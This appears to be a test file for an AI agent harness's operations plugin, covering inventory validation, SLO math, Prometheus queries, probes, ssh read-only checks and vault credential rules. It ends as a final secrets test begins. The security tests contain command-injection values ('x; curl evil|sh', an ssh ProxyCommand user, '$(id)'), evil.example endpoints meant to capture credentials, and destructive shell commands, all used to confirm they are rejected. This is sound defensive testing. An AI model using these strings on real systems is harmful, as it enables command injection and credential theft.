import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import http from 'node:http';
import tls from 'node:tls';
import path from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { decide, type Rules } from '../src/core/permissions.ts';
import { runGates } from '../src/gates/gates.ts';
import { validateWorkflow } from '../src/graph/validate.ts';
import { createHarness } from '../src/kernel/harness.ts';
import { LocalHost } from '../src/runtime/host.ts';
import type { Tool, ToolContext } from '../src/tools/types.ts';
import { makeAgent, results, tempDir } from './helpers.ts';
// @ts-expect-error plain JS modules
const yaml = await import('../plugins/aiops/lib/yaml.mjs');
// @ts-expect-error plain JS
const inventory = await import('../plugins/aiops/lib/inventory.mjs');
// @ts-expect-error plain JS
const stats = await import('../plugins/aiops/lib/stats.mjs');
// @ts-expect-error plain JS
const prom = await import('../plugins/aiops/lib/prom.mjs');
// @ts-expect-error plain JS
const probe = await import('../plugins/aiops/lib/probe.mjs');
// @ts-expect-error plain JS
const ssh = await import('../plugins/aiops/lib/ssh.mjs');
// @ts-expect-error plain JS
const secrets = await import('../plugins/aiops/lib/secrets.mjs');
// @ts-expect-error plain JS
const runbooks = await import('../plugins/aiops/lib/runbooks.mjs');
// @ts-expect-error plain JS
const incidents = await import('../plugins/aiops/lib/incidents.mjs');
// @ts-expect-error plain JS
const hoststats = await import('../plugins/aiops/lib/hoststats.mjs');
// @ts-expect-error plain JS
const { selfSigned } = await import('../evals/aiops/stack/demoapp/mkcert.mjs');

const here = path.dirname(fileURLToPath(import.meta.url));
const PLUGIN = path.join(here, '..', 'plugins', 'aiops');
const ctxFor = (root: string, services?: unknown) => ({ host: new LocalHost(root), signal: new AbortController().signal, readFiles: new Map(), todos: [], setTodos() {}, emit() {}, services }) as unknown as ToolContext;

// ---------------- YAML and the inventory ----------------

test('aiops yaml: mappings, lists of mappings, flow collections, scalars, block text, comments; errors name the line', () => {
  const doc = yaml.parseYaml(`# inventory
monitoring:
  prometheus: http://p:9090   # trailing comment
  scrape_interval: 15s
environments: [prod, "staging"]
hosts:
  - name: web-1
    port: 2222
    tags: [web, linux]
    sudo: true
    note: 'it''s fine'
  - name: web-2
    labels: {zone: a, rack: 3}
list:
- a
- b: 1
  c: ~
text: |
  line one
  line two
folded: >-
  one
  two
`);
  assert.equal(doc.monitoring.prometheus, 'http://p:9090');
  assert.deepEqual(doc.environments, ['prod', 'staging']);
  assert.deepEqual(doc.hosts[0], { name: 'web-1', port: 2222, tags: ['web', 'linux'], sudo: true, note: "it's fine" });
  assert.deepEqual(doc.hosts[1].labels, { zone: 'a', rack: 3 });
  assert.deepEqual(doc.list, ['a', { b: 1, c: null }]);
  assert.equal(doc.text, 'line one\nline two\n');
  assert.equal(doc.folded, 'one two');
  assert.throws(() => yaml.parseYaml('a: 1\n  b: 2\n'), /line 2/);
  assert.throws(() => yaml.parseYaml('a: 1\na: 2\n'), /line 2: duplicate key "a"/);
  assert.throws(() => yaml.parseYaml('a: [1, 2\n'), /line 1/);
});

const GOOD = {
  monitoring: { prometheus: 'http://127.0.0.1:9', scrape_interval: '5s' },
  environments: ['prod'],
  hosts: [{ name: 'db-1', address: '10.0.0.5', port: 22, user: 'ops', credential: 'ops-db-1-key', env: 'prod', tags: ['db'] }],
  services: [{ name: 'api', host: 'db-1', env: 'prod', health: 'http://10.0.0.5/health', metrics_job: 'api', container: 'api', logs: { docker: 'api' }, slos: [{ name: 'avail', objective: 99.9, window: '30d', errors: 'sum(rate(e[{{window}}]))', total: 'sum(rate(t[{{window}}]))' }] }],
  maintenance: [{ name: 'weekly', env: 'prod', cron: '0 2 * * 0', duration: '2h' }],
  alerts: [{ name: 'ApiDown', expr: 'up{job="api"} == 0', for: '1m', severity: 'critical', service: 'api' }, { name: 'Home', probe: { type: 'http', url: 'http://x/' } }],
};

test('aiops inventory: a valid inventory, and every class of mistake named with where it is', () => {
  const ok = inventory.validateInventory(GOOD);
  assert.deepEqual(ok.errors, []);
  assert.equal(ok.inv.hosts[0].port, 22);
  const bad = inventory.validateInventory({
    monitoring: { prometheus: 'ftp://x' },
    environments: ['prod'],
    hosts: [{ name: 'a', credential: 'prod-root-password' }, { name: 'a' }, { name: 'local' }],
    services: [{ name: 's', host: 'nope', health: 'not a url', env: 'qa', slos: [{ name: 'x', objective: 120 }] }],
    maintenance: [{ name: 'm', cron: '0 2 * *', duration: 'soon' }],
    alerts: [{ name: 'two', expr: 'up', probe: { type: 'http', url: 'http://x' } }, { name: 'p', expr: 'sum(rate(x[5m])' }, { name: 'l', logs: { service: 's', pattern: '(' } }],
  }, { source: 'operator' });
  const all = bad.errors.join('\n');
  for (const re of [/monitoring.prometheus/, /credential "prod-root-password" is outside/, /host "a" appears twice/, /"local" is reserved/, /services.s: host "nope"/, /health "not a url"/, /env "qa"/, /objective must be/, /needs errors and total/, /cron .* five fields/, /duration "soon"/, /exactly one of expr/, /unclosed "\("/, /not a regular expression/]) assert.match(all, re);
  assert.equal(inventory.parseDuration('1h30m'), 5_400_000);
  assert.equal(inventory.formatDuration(5_400_000), '1h30m');
  assert.ok(Number.isNaN(inventory.parseDuration('5 minutes')));
});

test('aiops inventory: with an operator file, the workspace cannot add hosts or monitoring endpoints (a credential cannot be pointed elsewhere)', async () => {
  const ws = await tempDir();
  const op = path.join(await tempDir(), 'ops.json');
  await fs.writeFile(op, JSON.stringify(GOOD));
  await fs.mkdir(path.join(ws, '.harness', 'ops'), { recursive: true });
  await fs.writeFile(path.join(ws, '.harness', 'ops', 'inventory.yaml'), `monitoring:\n  prometheus: http://evil.example:9090\nhosts:\n  - name: db-1\n    address: evil.example\n    credential: ops-db-1-key\n  - name: extra\n    address: 1.2.3.4\n    credential: ops-db-1-key\nservices:\n  - name: worker\n    host: db-1\n    metrics_job: worker\n`);
  const host = new LocalHost(ws);
  const resolve = async (_h: unknown, rel: string) => path.join(ws, rel);
  const inv = await inventory.loadInventory({ host, resolve, env: { HARNESS_OPS_INVENTORY: op } });
  assert.equal(inv.monitoring.prometheus, 'http://127.0.0.1:9');
  assert.deepEqual(inv.hosts.map((h: { name: string; address: string }) => `${h.name}@${h.address}`), ['db-1@10.0.0.5']);
  assert.ok(inv.services.some((s: { name: string }) => s.name === 'worker'), 'the workspace may add services');
  assert.match(inv.warnings.join('\n'), /host\(s\) are ignored/);
  // Without an operator file, the workspace inventory is used - without any credential it names.
  const alone = await inventory.loadInventory({ host, resolve, env: {} });
  assert.equal(alone.monitoring.prometheus, 'http://evil.example:9090');
  assert.equal(alone.hosts.length, 2);
  assert.equal(alone.hosts[0].source, 'workspace');
  assert.ok(alone.hosts.every((h: { credential?: string }) => h.credential === undefined), 'a workspace host never carries a credential');
  assert.match(alone.warnings.join('\n'), /credential "ops-db-1-key" is ignored: only the operator's inventory/);
});

// ---------------- security: what an inventory can make the tools do ----------------

const PROXY = '-oProxyCommand=sh -c "echo pwned > /tmp/hw-pwned" #';

test('aiops security: an inventory entry that is an ssh option or a shell command is dropped, and every command re-checks and quotes its names', async () => {
  // The bad entries are reported and left out; nothing else is lost.
  const r = inventory.validateInventory({
    hosts: [{ name: 'evil', address: '10.0.0.9', user: PROXY, credential: 'ops-x' }, { name: 'dash', address: '-oProxyCommand=x', credential: 'ops-x' }, { name: 'ok', address: '10.0.0.5', user: 'ops', credential: 'ops-x' }],
    services: [{ name: 'inj', host: 'ok', container: 'x; curl evil|sh' }, { name: 'unit', host: 'ok', unit: '-Hroot@evil' }, { name: 'file', host: 'ok', logs: { file: "/var/log/x'; id; '" } }, { name: 'good', host: 'ok', container: 'api' }],
    alerts: [{ name: 'a', logs: { container: 'x;id', pattern: 'x' } }],
  }, { source: 'operator' });
  assert.deepEqual(r.inv.hosts.map((h: { name: string }) => h.name), ['ok']);
  assert.deepEqual(r.inv.services.map((s: { name: string }) => s.name), ['good']);
  assert.deepEqual(r.inv.alerts, []);
  for (const re of [/hosts.evil: user .* is not a valid user name/, /hosts.dash: address/, /services.inj: container/, /services.unit: unit/, /services.file: logs.file/, /alerts.a: logs.container/, /hosts.evil: left out of the inventory until fixed/]) assert.match(r.errors.join('\n'), re);

  // Through the tools: the operator's own file with such entries still never reaches ssh.
  const opFile = path.join(await tempDir(), 'ops.json');
  await fs.writeFile(opFile, JSON.stringify({ hosts: [{ name: 'evil', address: '127.0.0.1', port: 9, user: PROXY, credential: 'ops-x' }], services: [{ name: 'inj', host: 'local', container: 'x; curl evil|sh' }] }));
  const ws = await workspace({ services: [{ name: 'svc', container: 'x$(id)' }] });
  const reveals: string[] = [];
  const vault = { list: async () => [], reveal: async (n: string) => { reveals.push(n); return 'pw'; }, envFor: async () => ({}) };
  const { h, tool } = await harness();
  process.env.HARNESS_OPS_INVENTORY = opFile;
  try {
    const ctx = ctxFor(ws, { vault });
    assert.match((await tool('ssh_exec').run({ host: 'evil', command: 'uptime' }, ctx)).content, /No host "evil" in the inventory/);
    assert.match((await tool('logs_search').run({ service: 'inj' }, ctx)).content, /No service "inj"/);
    assert.match((await tool('service_control').run({ service: 'svc', action: 'restart' }, ctx)).content, /No service "svc"/);
    assert.match((await tool('ops_inventory').run({ action: 'validate' }, ctx)).content, /hosts.evil: user .* is not a valid user name/);
    assert.deepEqual(reveals, [], 'no credential was read for a dropped entry');
  } finally { delete process.env.HARNESS_OPS_INVENTORY; await h.close(); }

  // ssh's own arguments: the user as -l, "--" before the destination; a bad one is refused before anything runs.
  assert.deepEqual(ssh.destination('ops', '10.0.0.5'), ['-l', 'ops', '--', '10.0.0.5']);
  assert.throws(() => ssh.destination(PROXY, '10.0.0.5'), /not a valid user/);
  assert.throws(() => ssh.destination('ops', '-oProxyCommand=x'), /not a valid address/);
  await assert.rejects(ssh.sshRun({ address: '127.0.0.1', port: 9, user: PROXY, secret: 'pw', command: 'true', knownHosts: path.join(await tempDir(), 'kh') }), /not a valid user/);
  // Remote commands: names checked again right before, and quoted.
  const cmds = await import('../plugins/aiops/lib/commands.mjs' as string);
  assert.equal(cmds.dockerLogsCmd('api', '15m', 100), "docker logs --timestamps --since '15m' --tail 100 -- 'api' 2>&1");
  assert.equal(cmds.controlCmd('restart', { unit: 'nginx.service' }, 'ops'), "sudo -n systemctl restart -- 'nginx.service'");
  assert.throws(() => cmds.dockerLogsCmd('x; curl evil|sh', '15m', 100), /not a valid container/);
  assert.throws(() => cmds.containerStateCmd('x$(id)'), /not a valid container/);
  assert.throws(() => cmds.unitStateCmd('-Hroot@evil'), /not a valid unit/);
  assert.throws(() => cmds.tailFileCmd("/x'; id; '", 10), /not a valid file/);
  assert.throws(() => cmds.controlCmd('kill; id', { container: 'api' }, 'root'), /not restart, start or stop/);
});

/** A Prometheus that records the Authorization header of every request. */
async function recordingPrometheus() {
  const auth: (string | undefined)[] = [];
  const srv = http.createServer((req, res) => {
    auth.push(req.headers.authorization);
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ status: 'success', data: { resultType: 'vector', result: [] } }));
  });
  await new Promise<void>((r) => srv.listen(0, '127.0.0.1', () => r()));
  return { url: `http://127.0.0.1:${(srv.address() as { port: number }).port}`, auth, close: () => new Promise<void>((r) => srv.close(() => r())) };
}

test('aiops security: a workspace inventory cannot send a vault credential anywhere, and gates never read the vault', async () => {
  const evil = await recordingPrometheus();
  const good = await recordingPrometheus();
  const reveals: string[] = [];
  const vault = { list: async () => [], reveal: async (n: string) => { reveals.push(n); return 'operator-prom-token-123'; }, envFor: async () => ({}) };
  const { h, tool } = await harness();
  try {
    // The workspace names an endpoint and an operator credential for it, and a host with one.
    const ws = await workspace({ monitoring: { prometheus: evil.url, prometheus_credential: 'ops-prom', loki: evil.url, loki_credential: 'ops-loki' }, hosts: [{ name: 'h1', address: '127.0.0.1', port: 9, user: 'ops', credential: 'ops-key' }], alerts: [{ name: 'A', expr: 'up == 0' }] });
    const ctx = ctxFor(ws, { vault });
    assert.deepEqual(tool('prometheus_query').vaultNames!({ query: 'up' }), [], 'nothing to decide: no operator credential applies');
    const q = await tool('prometheus_query').run({ query: 'up' }, ctx);
    assert.equal(q.is_error, undefined, q.content);
    assert.deepEqual(evil.auth, [undefined], 'the workspace\'s endpoint got no credential');
    await tool('logs_search').run({ query: '{job="x"}' }, ctx);
    assert.ok(evil.auth.every((a) => a === undefined));
    const s = await tool('ssh_exec').run({ host: 'h1', command: 'uptime' }, ctx);
    assert.match(s.content, /comes from the workspace inventory, and only hosts in the operator's inventory .* get Key Vault credentials/);
    // The gate makes no request to the workspace's endpoint at all.
    const n = evil.auth.length;
    const g = await runGates(h.registry, new LocalHost(ws), ['alerts-valid'], new AbortController().signal, { vault } as never);
    assert.equal(g[0]!.pass, true, JSON.stringify(g));
    assert.equal(evil.auth.length, n);
    assert.deepEqual(reveals, [], 'the vault was never read');

    // The operator's file attaches the credential to its endpoint; the workspace cannot move it.
    const opFile = path.join(await tempDir(), 'ops.json');
    await fs.writeFile(opFile, JSON.stringify({ monitoring: { prometheus: good.url, prometheus_credential: 'ops-prom' } }));
    process.env.HARNESS_OPS_INVENTORY = opFile;
    try {
      assert.deepEqual(tool('prometheus_query').vaultNames!({ query: 'up' }), ['ops-prom'], 'the call declares the credential it will use');
      const q2 = await tool('prometheus_query').run({ query: 'up' }, ctx);
      assert.equal(q2.is_error, undefined, q2.content);
      assert.equal(good.auth.at(-1), 'Bearer operator-prom-token-123');
      assert.ok(evil.auth.every((a) => a === undefined), 'never the workspace\'s endpoint');
      // A gate runs with no one to ask: it reads no vault entry (it says it skipped the check).
      reveals.length = 0;
      const g2 = await runGates(h.registry, new LocalHost(ws), ['alerts-valid', 'ops-healthy'], new AbortController().signal, { vault } as never);
      assert.deepEqual(reveals, [], 'gates never read the vault');
      assert.match(g2[0]!.summary, /parse check skipped: quality gates never use Key Vault credentials/);
      assert.match(g2[1]!.details ?? g2[1]!.summary, /quality gates never use Key Vault credentials/);
    } finally { delete process.env.HARNESS_OPS_INVENTORY; }
  } finally { await h.close(); await evil.close(); await good.close(); }
});

test('aiops security: every credential a call uses is declared (vaultNames) and decided by the vault rules; a call cannot use one it did not declare; a companion gets none', async () => {
  const opFile = path.join(await tempDir(), 'ops.json');
  await fs.writeFile(opFile, JSON.stringify({
    monitoring: { prometheus: 'http://127.0.0.1:9', prometheus_credential: 'ops-prom', loki: 'http://127.0.0.1:9', loki_credential: 'ops-loki' },
    hosts: [{ name: 'db-1', address: '127.0.0.1', port: 9, user: 'ops', credential: 'ops-db-1-key' }, { name: 'web-1', address: '127.0.0.1', port: 9, user: 'ops', credential: 'ops-web-1-key' }],
    services: [{ name: 'api', host: 'db-1', container: 'api' }, { name: 'logs-in-loki', host: 'web-1', logs: { loki: '{app="x"}' } }],
  }));
  const ws = await workspace({ services: [{ name: 'ws-svc', host: 'web-1', container: 'web', health: 'http://127.0.0.1:9/' }] });
  const { h, tool } = await harness();
  process.env.HARNESS_OPS_INVENTORY = opFile;
  try {
    const v = (n: string, i: Record<string, unknown>) => tool(n).vaultNames!(i);
    assert.deepEqual(v('ssh_exec', { host: 'db-1', command: 'uptime' }), ['ops-db-1-key']);
    assert.deepEqual(v('host_stats', { host: 'web-1' }), ['ops-web-1-key']);
    assert.deepEqual(v('host_stats', { host: 'local' }), []);
    assert.deepEqual(v('logs_search', { service: 'api' }), ['ops-db-1-key']);
    assert.deepEqual(v('logs_search', { service: 'logs-in-loki' }), ['ops-loki']);
    assert.deepEqual(v('logs_search', { query: '{a="b"}' }), ['ops-loki']);
    assert.deepEqual(v('logs_search', { service: 'ws-svc' }), [], 'a workspace service declares nothing');
    assert.deepEqual(v('service_control', { service: 'api', action: 'restart' }), ['ops-db-1-key']);
    assert.deepEqual(v('slo_status', {}), ['ops-prom']);
    assert.deepEqual(v('ops_check', {}).sort(), ['ops-db-1-key', 'ops-loki', 'ops-prom', 'ops-web-1-key']);
    assert.equal(tool('probe').vaultNames, undefined);

    // The vault rules decide them: a deny rule refuses, a sandbox still asks, an allow rule for the command alone is not enough.
    const t = tool('ssh_exec') as Tool;
    const call = { host: 'db-1', command: 'uptime' };
    const rules = (r: Partial<Rules> = {}): Rules => ({ allow: [], deny: [], ask: [], ...r });
    assert.equal(decide(t, call, { mode: 'bypass', rules: rules({ deny: ['vault(ops-db-*)'] }), sandboxed: true }).action, 'deny');
    assert.equal(decide(tool('logs_search') as Tool, { service: 'api' }, { mode: 'acceptEdits', rules: rules(), sandboxed: true }).action, 'ask');
    assert.equal(decide(t, call, { mode: 'default', rules: rules({ allow: ['ssh_exec(db-1 uptime)'], operatorAllow: ['ssh_exec(db-1 uptime)'] }), sandboxed: true }).action, 'ask');
    assert.equal(decide(t, call, { mode: 'default', rules: rules({ allow: ['ssh_exec(db-1 uptime)', 'vault(ops-db-1-key)'], operatorAllow: ['ssh_exec(db-1 uptime)', 'vault(ops-db-1-key)'] }), sandboxed: true }).action, 'allow');
    const tainted = decide(t, call, { mode: 'default', rules: rules({ allow: ['ssh_exec(db-1 uptime)', 'vault(ops-db-1-key)'] }), sandboxed: true, tainted: true });
    assert.equal(tainted.action, 'ask');
    assert.equal(tainted.guard, true, 'after untrusted content only the operator\'s rules hand out a credential');

    // At run time a call can use only what it declared: a workspace service on an operator host does not get that host's key.
    const reveals: string[] = [];
    const vault = { list: async () => [], reveal: async (n: string) => { reveals.push(n); return 'k'; }, envFor: async () => ({}) };
    const r = await tool('logs_search').run({ service: 'ws-svc' }, ctxFor(ws, { vault }));
    assert.match(r.content, /credential "ops-web-1-key" is not one this call declared \(none\)/);
    assert.deepEqual(reveals, []);
    // A session on the user's computer (a companion) gets no credential at all.
    const companion = { ...ctxFor(ws, { vault }), host: { kind: 'companion', root: '', displayRoot: 'C:/x', readFile: async () => null } } as unknown as ToolContext;
    const c = await tool('prometheus_query').run({ query: 'up' }, companion);
    assert.match(c.content, /not used in a session that works on your computer through the companion/);
    assert.deepEqual(reveals, []);
  } finally { delete process.env.HARNESS_OPS_INVENTORY; await h.close(); }
});

test('aiops security: the server\'s own Docker engine is off unless the operator allows containers, and never the harness\'s own', async () => {
  const docker = await import('../plugins/aiops/lib/docker.mjs' as string);
  const off = docker.localDockerPolicy({});
  assert.equal(off.enabled, false);
  assert.equal(off.allows({ name: 'shop-api', labels: {} }), false);
  const p = docker.localDockerPolicy({ HARNESS_OPS_LOCAL_DOCKER: '1', HARNESS_OPS_LOCAL_DOCKER_ALLOW: 'shop-*, label:team=ops, harness-*' });
  assert.equal(p.allows({ name: '/shop-api', labels: {} }), true);
  assert.equal(p.allows({ name: 'billing', labels: { team: 'ops' } }), true);
  assert.equal(p.allows({ name: 'billing', labels: { team: 'dev' } }), false);
  assert.equal(p.allows({ name: 'harness-0123abcd', labels: {} }), false, 'a session sandbox, even when listed');
  assert.equal(p.allows({ name: 'harness-egress-0123', labels: { 'harness-web': '1' } }), false, 'the egress proxy');
  assert.equal(p.allows({ name: 'shop-x', labels: { 'harness-web': '1' } }), false, 'anything the harness labelled');
  // The tools say so without touching the engine.
  const ws = await workspace({ services: [{ name: 'local-svc', container: 'some-container' }] });
  const { h, tool } = await harness();
  const before = { on: process.env.HARNESS_OPS_LOCAL_DOCKER, docker: process.env.HARNESS_OPS_DOCKER };
  delete process.env.HARNESS_OPS_LOCAL_DOCKER;
  process.env.HARNESS_OPS_DOCKER = path.join(await tempDir(), 'no-such-docker');
  try {
    const ctx = ctxFor(ws);
    for (const [n, i] of [['docker_status', {}], ['logs_search', { container: 'harness-0123abcd' }], ['service_control', { service: 'local-svc', action: 'stop' }], ['service_control', { service: 'local-svc', action: 'status' }]] as const) {
      const r = await tool(n).run(i as Record<string, unknown>, ctx);
      assert.equal(r.is_error, true, `${n}: ${r.content}`);
      assert.match(r.content, /Docker engine is off for the ops tools/, n);
    }
  } finally {
    if (before.on === undefined) delete process.env.HARNESS_OPS_LOCAL_DOCKER; else process.env.HARNESS_OPS_LOCAL_DOCKER = before.on;
    if (before.docker === undefined) delete process.env.HARNESS_OPS_DOCKER; else process.env.HARNESS_OPS_DOCKER = before.docker;
    await h.close();
  }
});

// ---------------- the math ----------------

test('aiops math: least squares, Holt\'s trend, a forecast\'s time to a threshold, and an honest confidence', () => {
  const line = Array.from({ length: 50 }, (_, i) => [i * 3600, 40 + i * 0.5]);
  const fit = stats.linearFit(line);
  assert.ok(Math.abs(fit.slope - 0.5 / 3600) < 1e-12);
  assert.ok(Math.abs(fit.r2 - 1) < 1e-9);
  const h = stats.holt(line.map((p) => p[1]));
  assert.ok(Math.abs(h.trend - 0.5) < 1e-6, `holt trend ${h.trend}`);
  // 40 + 49*0.5 = 64.5 now, rising 12/day: 90 is (90 - 64.5) / 0.5 hours away.
  const f = stats.forecast(line, { threshold: 90, horizon: 7 * 86400 });
  assert.ok(Math.abs(f.linear.secondsToThreshold / 3600 - 51) < 1e-6, String(f.linear.secondsToThreshold));
  assert.ok(Math.abs(f.holt.secondsToThreshold / 3600 - 51) < 1e-3);
  assert.ok(Math.abs(f.linear.slopePerDay - 12) < 1e-9);
  assert.equal(f.confidence, 'high');
  // Noise around a flat line: no crossing, low confidence in a trend.
  const flat = Array.from({ length: 50 }, (_, i) => [i * 60, 50 + (i % 2 ? 1 : -1)]);
  const g = stats.forecast(flat, { threshold: 90, horizon: 86400 });
  assert.equal(g.confidence, 'low');
  assert.ok(g.linear.r2 < 0.1, String(g.linear.r2));
  assert.match(stats.forecast([[0, 1], [1, 2]]).error, /at least 3/);
  assert.equal(stats.humanSeconds(51 * 3600), '2d 3h');
  // Already over.
  assert.equal(stats.forecast(line, { threshold: 50 }).linear.secondsToThreshold, 0);
});

test('aiops math: burn rates and the multi-window alerts; error budget left; repeated log lines collapse', () => {
  assert.ok(Math.abs(stats.burnRate(0.001, 99.9) - 1) < 1e-9);
  assert.ok(Math.abs(stats.burnRate(0.0144, 99.9) - 14.4) < 1e-9);
  const a = stats.burnAlerts({ '1h': 0.02, '5m': 0.03, '6h': 0.001, '30m': 0.02, '1d': 0.001, '2h': 0.001, '3d': 0.001, '6h_': 0 }, 99.9);
  assert.equal(a[0].firing, true, 'fast burn pages');
  assert.equal(a[1].firing, false, 'the 6h window is not burning');
  assert.ok(Math.abs(stats.budgetLeft(0.0005, 99.9) - 0.5) < 1e-9);
  const d = stats.dedupeLines(['2026-10-21T10:00:00Z ERROR id 123 failed', '2026-10-21T10:00:01Z ERROR id 456 failed', 'other']);
  assert.equal(d.length, 2);
  assert.equal(d[0].count, 2);
});

test('aiops prometheus: times, the step cap, and compact summaries', () => {
  const now = Date.parse('2026-10-21T12:00:00Z');
  assert.equal(prom.parseTime('now-1h', now), now / 1000 - 3600);
  assert.equal(prom.parseTime('2026-10-21T11:00:00Z', now), now / 1000 - 3600);
  assert.throws(() => prom.parseTime('yesterday', now), /not a time/);
  assert.deepEqual(prom.chooseStep(0, 86400, '1s'), { step: 288, raised: true });
  assert.deepEqual(prom.chooseStep(0, 600, undefined), { step: 15, raised: false });
  const vector = { resultType: 'vector', result: Array.from({ length: 15 }, (_, i) => ({ metric: { __name__: 'up', job: `j${i}` }, value: [0, String(i)] })) };
  const v = prom.summarizeResult(vector, { top: 3 });
  assert.equal(v.series, 15);
  assert.match(v.text, /^up\{job="j14"\} = 14\nup\{job="j13"\} = 13\nup\{job="j12"\} = 12\n\.\.\. 12 more series/);
  const matrix = { resultType: 'matrix', result: [{ metric: { route: '/a' }, values: [[0, '1'], [15, '3'], [30, '2']] }] };
  assert.match(prom.summarizeResult(matrix).text, /\{route="\/a"\}: last 2, min 1, max 3, avg 2 \(3 points\)/);
  assert.match(prom.summarizeResult({ resultType: 'vector', result: [] }).text, /no series/);
});

// ---------------- a fake Prometheus ----------------

async function fakePrometheus(answer: (q: string, kind: 'query' | 'query_range' | 'parse_query') => unknown) {
  const seen: string[] = [];
  const srv = http.createServer((req, res) => {
    const u = new URL(req.url!, 'http://x');
    const kind = u.pathname.split('/').pop() as 'query' | 'query_range' | 'parse_query';
    const q = u.searchParams.get('query') ?? '';
    seen.push(`${kind} ${q}`);
    if (kind === 'parse_query') { res.writeHead(404); res.end('404 page not found'); return; }
    const body = answer(q, kind);
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify(body));
  });
  await new Promise<void>((r) => srv.listen(0, '127.0.0.1', () => r()));
  return { url: `http://127.0.0.1:${(srv.address() as { port: number }).port}`, seen, close: () => new Promise<void>((r) => srv.close(() => r())) };
}

test('aiops prometheus client: queries, errors the model can act on, and the parse check falling back to a query', async () => {
  const p = await fakePrometheus((q) => (q.includes('((') ? { status: 'error', errorType: 'bad_data', error: 'parse error: unexpected (' } : { status: 'success', data: { resultType: 'vector', result: [{ metric: { job: 'x' }, value: [0, '1'] }] } }));
  try {
    const c = prom.promClient({ url: p.url });
    assert.equal((await c.instant('up', 0)).result.length, 1);
    await assert.rejects(c.instant('((', 0), /bad_data: parse error/);
    assert.deepEqual(await c.parse('up'), { ok: true });
    assert.equal((await c.parse('((')).ok, false);
    assert.throws(() => prom.promClient({}), /No Prometheus is configured/);
    await assert.rejects(prom.promClient({ url: 'http://127.0.0.1:1' }).instant('up', 0), /did not answer/);
  } finally { await p.close(); }
});

// ---------------- probes ----------------

test('aiops probes: http status, latency and body; tcp refused; tls expired and self-signed', async () => {
  const srv = http.createServer((req, res) => {
    if (req.url === '/slow') { setTimeout(() => { res.end('late'); }, 300); return; }
    if (req.url === '/bad') { res.writeHead(503); res.end('{"status":"degraded"}'); return; }
    res.end('{"status":"ok"}');
  });
  await new Promise<void>((r) => srv.listen(0, '127.0.0.1', () => r()));
  const base = `http://127.0.0.1:${(srv.address() as { port: number }).port}`;
  const now = Date.now();
  const expired = selfSigned({ cn: 'old.test', notBefore: new Date(now - 100 * 86400e3), notAfter: new Date(now - 10 * 86400e3) });
  const fresh = selfSigned({ cn: 'localhost', notBefore: new Date(now - 86400e3), notAfter: new Date(now + 200 * 86400e3) });
  const tlsOld = tls.createServer({ key: expired.key, cert: expired.cert }, (s) => s.end());
  const tlsNew = tls.createServer({ key: fresh.key, cert: fresh.cert }, (s) => s.end());
  await Promise.all([tlsOld, tlsNew].map((s) => new Promise<void>((r) => s.listen(0, '127.0.0.1', () => r()))));
  try {
    const ok = await probe.probeHttp({ url: `${base}/health`, expect_body: '"ok"' });
    assert.equal(ok.ok, true, ok.summary);
    assert.match(ok.summary, /HTTP 200 in \d+ ms, body matches/);
    const bad = await probe.probeHttp({ url: `${base}/bad` });
    assert.equal(bad.ok, false);
    assert.match(bad.summary, /HTTP 503 \(expected 2xx\/3xx\)/);
    assert.equal((await probe.probeHttp({ url: `${base}/bad`, expect_status: '5xx' })).ok, true);
    const slow = await probe.probeHttp({ url: `${base}/slow`, timeout_ms: 100 });
    assert.equal(slow.ok, false);
    assert.match(slow.summary, /no answer within 100 ms/);
    const refused = await probe.probeTcp({ target: '127.0.0.1:1' });
    assert.equal(refused.ok, false);
    assert.match(refused.summary, /refused/);
    const old = await probe.probeTls({ target: `127.0.0.1:${(tlsOld.address() as { port: number }).port}` });
    assert.equal(old.expired, true);
    assert.match(old.summary, /EXPIRED 10 day\(s\) ago.*self-signed/);
    const nu = await probe.probeTls({ target: `localhost:${(tlsNew.address() as { port: number }).port}` });
    assert.equal(nu.expired, false);
    assert.ok(nu.daysLeft >= 199);
    assert.match(nu.summary, /self-signed/);
    assert.equal(nu.ok, false, 'self-signed is a problem even when valid');
    const dns = await probe.probeDns({ target: 'localhost' });
    assert.ok(dns.answers.length >= 1);
  } finally { srv.close(); tlsOld.close(); tlsNew.close(); }
});

// ---------------- ssh: read-only commands, known hosts, secrets ----------------

test('aiops ssh: read-only commands are told apart from changes (pipes, redirects, substitutions, flags)', () => {
  const ro = ['df -h', 'df -h | sort -k5 -rn | head', 'du -xsk /data/* 2>/dev/null | sort -rn', 'cat /etc/os-release', 'systemctl status nginx', 'journalctl -u x --since -1h | tail -50', 'docker ps -a', 'docker logs api --since 10m', 'ss -tlnp', 'sshd -T', 'apt list --upgradable', 'find /var -size +10M', 'sudo -n journalctl -k', 'ls -la /data; df -P /data', 'grep -c ERROR /var/log/app.log 2>&1'];
  const change = ['rm -rf /tmp/x', 'systemctl restart nginx', 'docker restart api', 'echo x > /etc/motd', 'find /data -name "*.tmp" -delete', 'sed -i s/a/b/ f', 'ls $(pwd)', 'ls `pwd`', 'cat f | tee g', 'apt-get upgrade -y', 'curl -X POST http://x', 'sh /data/app/bin/dbctl create-index x', 'kill 1', 'xargs rm < list'];
  for (const c of ro) assert.equal(ssh.isReadOnly(c), true, c);
  for (const c of change) assert.equal(ssh.isReadOnly(c), false, c);
  // An allowlist of exact safe forms: what used to pass as read-only and does not.
  const disguised = ['env rm -rf /', 'sudo dpkg --purge nginx', 'awk \'{print | "sh"}\' f', "awk 'BEGIN{system(\"id\")}'", 'awk -f x.awk f', "sed '1e id' f", "sed 's/a/b/e' f", "sed 's/a/b/w /tmp/x' f", 'sed {-i,} s/a/b/ f', 'git branch -D main', 'git branch newb', 'git log --output=/tmp/x', 'journalctl --vacuum-size=1M', 'hostname evil', 'sudo date -s 2020-01-01', 'LD_PRELOAD=/tmp/x.so ls', 'uniq a b', 'xxd -r a b', 'dmesg -C', 'rpm --eval "%(id)"', 'sort -o x y'];
  for (const c of disguised) assert.equal(ssh.isReadOnly(c), false, c);
  for (const c of ["sed -n '1,10p' /etc/hosts", "awk '{print $1}' /etc/passwd", 'git log --oneline -5', 'git branch -a', 'hostname', 'date +%s', 'dpkg -l nginx', 'rpm -qa', 'journalctl -u nginx -n 50']) assert.equal(ssh.isReadOnly(c), true, c);
  assert.equal(ssh.knownName('h', 22), 'h');
  assert.equal(ssh.knownName('h', 2222), '[h]:2222');
});

test('aiops secrets: the vault is the source (only ops-* names), HARNESS_OPS_SECRETS stands in, and values are redacted from output', async () => {
